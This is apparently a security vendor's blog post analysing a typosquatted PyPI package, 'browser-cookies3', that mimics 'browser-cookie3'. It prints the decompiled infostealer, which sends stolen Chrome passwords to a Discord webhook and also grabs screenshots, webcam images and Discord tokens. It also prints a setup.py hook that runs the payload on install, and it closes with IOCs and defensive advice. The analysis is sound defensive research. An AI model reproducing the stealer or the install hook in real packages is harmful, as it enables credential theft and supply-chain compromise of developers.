---
title: "Typosquatting on PyPI: Malicious Package Mimics Popular 'browser-cookie3' Library to Steal Sensitive Data"
short_title: "Typosquatting on PyPI: Mimicking 'browser-cookie3'"
date: 2024-10-11 12:00:00 +0000
categories: [PyPI]
tags: [Typosquatting, Infostealer, Python, PyPI, T1195.002, T1036.005, T1546.016, T1059.006, T1555.003, T1552.001, T1113, T1125, T1567.004, T1070.004]
canonical_url: https://socket.dev/blog/typosquatting-on-pypi-malicious-package-mimics-popular-browser-cookie-library
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/d36d7daa8f61ca108eb3e0da29e5fe5d96f1779a-1024x1024.webp
  alt: "Typosquatting on PyPI with malicious browser-cookies3 package"
description: "Socket detected a malicious Python package impersonating a popular browser cookie library to steal passwords, screenshots, webcam images, and Discord tokens."
---

The Socket Threat Research Team has identified a malicious PyPI package, "[browser-cookies3](https://socket.dev/pypi/package/browser-cookies3/overview/1.1/tar-gz)", which is impersonating the popular "[browser-cookie3](https://socket.dev/pypi/package/browser-cookie3)" package. Note that the malicious browser-cookies3 package has letter "s" in the word "cookies", aiming to trick developers into accidentally installing it. If installed, the malicious Python script will harvest and exfiltrate sensitive user information, including passwords, screenshots, webcam images, and Discord authentication tokens. According to PePy, the malicious browser-cookies3 package was [downloaded](https://www.pepy.tech/projects/browser-cookies3) 196 times.

## Catching One Typosquatter's Hand in the Cookie Jar

The legitimate Python package [browser-cookie3](https://socket.dev/pypi/package/browser-cookie3) loads cookies from various web browsers into a `cookiejar` object, enabling HTTP requests originating from Python to include the browser's cookies and access web content without requiring additional login steps. This package has been [downloaded](https://www.piwheels.org/project/browser-cookie3/) over 3 million times, and has been [used](https://github.com/borisbabic/browser_cookie3) by thousands of developers since [2015](https://github.com/borisbabic/browser_cookie3/commit/ae91e91eeadb775db9d536e7dcea5365664cff00).

![](https://cdn.sanity.io/images/cgdhsj6q/production/7b1b8d943338e6fdbc57b604799017806b99d6ef-1320x548.png)

Socket's AI scanner flagged the malicious code package as malware, providing the following context:

_"According to Socket's data, the code possesses potential security risks due to the automatic execution of a script during installation and the inclusion of an unexplained binary file"._

The Socket Threat Research Team obtained and analyzed this unexplained binary file named "**client.exe**" (SHA256: d7e3402341dcba66a6ed3e92889c655aa08d5103d1a65133f0a05f12d9390bb4). As of the time of this writing, 30 out of 72 security vendors [flagged](https://www.virustotal.com/gui/file/d7e3402341dcba66a6ed3e92889c655aa08d5103d1a65133f0a05f12d9390bb4) this file as malicious via the security analyzer VirusTotal.

The threat actor used [PyInstaller](https://socket.dev/pypi/package/pyinstaller) to convert their malicious Python script into a Windows executable file (PE file) for packaging into the malicious Python module. They appear to be using PyInstaller to evade detection. Based on our code analysis, the threat actor designed the Python script to collect sensitive information from the victim's computer and exfiltrate it to a specified Discord webhook URL.

After extracting the contents of the PyInstaller-generated executable file with "[PyInstallerExtractor](https://github.com/extremecoders-re/pyinstxtractor)" and decompiling the executable using "[PyCDC](https://github.com/zrax/pycdc)", we recovered the original code shown in Figure 2.

```python
import os
import requests
import threading
import screenshot
import delete_temp
import passwords
import getdc
import getcam
WEBHOOK_URL = 'hxxps://discordapp[.]com/api/webhooks/1284874320556064859/IRz_BFstxKu2-8cHHoF5xEXV4QYYQXkOAI8RwZJ317fJQGRxtbcPcYBeEnwv4dNM9NbZ'

def get_passwords():
   f_path = passwords.main()
   with open(f_path, 'rb') as f:
       requests.post(WEBHOOK_URL, files={'file': f}, data={'content': 'Here are the retrieved Chrome passwords.'})
   os.remove(f_path)

def make_screenshots():
   screenshot.main()

def main():
   try:
       threading.Thread(target=get_passwords())
   except Exception as e:
       continue
   try:
       threading.Thread(target=make_screenshots())
   except Exception as e:
       continue
   try:
       threading.Thread(target=delete_temp.main())
   except Exception as e:
       continue
   try:
       threading.Thread(target=getdc.get_token())
   except Exception as e:
       continue
   try:
       threading.Thread(target=getcam.capture_image())
   except Exception as e:
       return None
try:
   main()
except Exception as e:
   pass
```

Besides including the `os`, `requests`, and `threading` modules provided by the standard Python library, the script relies on several threat-actor-developed custom modules: `screenshot`, `delete_temp`, `passwords`, `getdc`, and `getcam`. Based on an analysis of these malicious modules, we assess that the custom modules are designed to capture screenshots, retrieve Chrome passwords, access the webcam, and delete temporary files.

The function `get_passwords()` calls the `passwords.main()` method to retrieve passwords saved in the Chrome browser. The `get_passwords()` function collects stored passwords, saves them to a temporary file, and exfiltrates the file to a Discord webhook using an HTTP POST request (with a data content string of "Here are the retrieved Chrome passwords"). The function then covers its tracks by deleting the temporary password file from the local system.

Function `make_screenshots()` calls `screenshot.main()`, which is used to capture and exfiltrate screenshots of the user's screen. Function `getcam.capture_image()` captures images from the user's webcam. Function `getdc.get_token()` retrieves Discord tokens from the user's system.

The threat actor's `setup.py` script included in the browser_cookies3 package is designed to execute malicious code automatically during the package installation process. By overriding the default installation command with a custom class `CustomInstallCommand`, the threat actor ensures that their `main.py` script is executed immediately when a user installs the package using tools like `pip`. This script execution occurs without the victim's awareness, leveraging the trusted installation mechanism to run malicious code.

The custom install command calls the standard `Setuptools` installation and then uses `subprocess.run()` to execute `main.py`, which contains the malicious payload whose capabilities were covered earlier.

![](https://cdn.sanity.io/images/cgdhsj6q/production/b3407ee3e7be4d5bd8d7a7edb47f2c60a828476f-1541x284.png)

```python
from setuptools import setup, find_packages
from setuptools.command.install import install as _install
import subprocess
import sys, os

class CustomInstallCommand(_install):
    def run(self):
        _install.run(self)
        script_path = os.path.join(os.path.dirname(__file__), 'browser_cookies3', 'main.py')
        subprocess.run([sys.executable, script_path], check=True)

setup(
    name='browser_cookies3',
    version='1.1',
    packages=find_packages(),
    include_package_data=True,
    package_data={
        'browser_cookies3': ['client.exe'],
    },
    install_requires=[],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
```

The browser-cookies3 package is a salient example of typosquatting, a technique where attackers publish a malicious package with a name similar to a legitimate one. This incident is part of a broader trend of software supply chain attacks, where threat actors employ typosquatting techniques in open-source repositories to distribute malware.

Frequently, developers will include or install open-source packages, and due to time and budgetary constraints, may not thoroughly inspect dependency code or verify its integrity. If a developer unknowingly installs a malicious package like browser-cookies3, and includes it in their project, it could breach the developer's environment, and ultimately a production environment, and in a worst-case scenario lead to a larger compromise of end users who rely on the developer's application.

Socket can help detect malware and malicious behavior in code packages to prevent these types of software supply chain attacks. We petitioned the package registry to remove the malicious browser-cookies3 package. Socket helps developers identify and prevent the execution of malicious code by using AI scanners, automation, machine learning, and Socket's Threat Research Team. Additionally, developers should adopt proactive security measures, such as:

- Verifying package names and authors before installation
- Employing security scanners and tools to detect anomalous behavior in code packages, like [Socket for GitHub](https://socket.dev/features/github)
- Enforcing stricter controls and policies for sourcing third-party libraries; such as requiring signed packages or implementing continuous security audits of their dependencies.

### Indicators of Compromise (IOCs):

- "client.exe" – SHA256: d7e3402341dcba66a6ed3e92889c655aa08d5103d1a65133f0a05f12d9390bb4
- Discord webhook URL: hxxps://discordapp[.]com/api/webhooks/1284874320556064859/IRz_BFstxKu2-8cHHoF5xEXV4QYYQXkOAI8RwZJ317fJQGRxtbcPcYBeEnwv4dNM9NbZ

## MITRE ATT&CK:

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1036.005 — Masquerading: Match Legitimate Name or Location
- T1546.016 — Event Triggered Execution: Installer Packages
- T1059.006 — Command and Scripting Interpreter: Python
- T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
- T1552.001 — Unsecured Credentials: Credentials In Files
- T1113 — Screen Capture
- T1125 — Video Capture
- T1567.004 — Exfiltration Over Web Service: Exfiltration Over Webhook
- T1070.004 — Indicator Removal: File Deletion
